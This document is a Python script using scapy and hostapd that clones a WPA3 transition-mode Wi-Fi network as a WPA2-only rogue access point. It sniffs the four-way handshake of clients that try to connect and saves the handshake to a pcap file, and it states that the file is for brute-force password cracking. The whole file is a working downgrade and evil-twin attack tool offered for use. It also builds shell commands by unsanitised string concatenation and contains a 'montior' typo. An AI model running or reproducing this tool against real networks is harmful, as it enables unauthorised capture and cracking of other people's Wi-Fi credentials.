#!/usr/bin/env python3
from scapy.all import *
import argparse, os, subprocess, time
hostapd = None
apMac = None
savedPackets = []

def configureInterface(iface):
    os.system("rfkill unblock wifi")
    os.system("ifconfig " + iface + " down")
    os.system("iwconfig " + iface + " mode montior")
    os.system("ifconfig " + iface + " up")
    os.system("iw " + iface + " set channel 1")

def getMacAddr(iface):
    mac = os.popen("ip -o link show | grep " + iface + " | cut -d ' ' -f 20").read().strip("\n")
    return mac

def setUpHostapd(ssid, iface):
    global hostapd
    with open('hostapdTransDowngrade.conf', 'w') as fp:
        fp.write("interface=" + iface + "\n" + "ssid=" + ssid + "\n" + 
        "hw_mode=g\nchannel=1\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\nauth_algs=3\nwpa_passphrase=passphrase\nwpa=2\n")
    hostapd = subprocess.Popen(["hostapd", "hostapdTransDowngrade.conf", "-dd", "-K"],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(1)

def getEapolMessageNum(packet):
    if not EAPOL in packet: return None
    keyInformation = packet[EAPOL].load.hex()[2:6]
    secureBit = format(int(keyInformation[1], 16), "04b")[2]
    ackBit = format(int(keyInformation[2], 16), "04b")[0]
    if(ackBit == "1"):
        if(secureBit == "0"):
            return 1
        else:
            return 3
    else:
        if(secureBit == "0"):
            return 2
        else:
            return 4

def isTryingToConnect(packet):
    global savedPackets
    if(isinstance(packet, scapy.layers.dot11.RadioTap) and (packet.addr1 == apMac or packet.addr2 == apMac)):
        msgNum = getEapolMessageNum(packet)
        if msgNum is not None: 
            savedPackets.append(packet)
        if msgNum == 2:
            print("SUCCESS! Someone tried to connect to the WPA2-Only-Network. Saving Handshake-Messages for potential Brute-Force Attacks.")
            return True
        else:
            return False
    else:
        return False

def cleanUp():
    if hostapd:
        print("cleaning up...")
        hostapd.terminate()
        hostapd.wait()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ssid", help="SSID of the WPA3-Tranistion-Mode AP to clone")
    parser.add_argument("interfaceAP", help="interface to clone the Network on")
    parser.add_argument("interfaceSniff", help="interface to sniff Handshake Messages")
    args = parser.parse_args()
    atexit.register(cleanUp)

    configureInterface(args.interfaceSniff)
    apMac = getMacAddr(args.interfaceAP)
    setUpHostapd(args.ssid, args.interfaceAP)
    sniff(iface=args.interfaceSniff, stop_filter=isTryingToConnect)
    pcap = PcapWriter("downgrade.pcap", append=True, sync=True)
    for p in savedPackets:
        pcap.write(p)
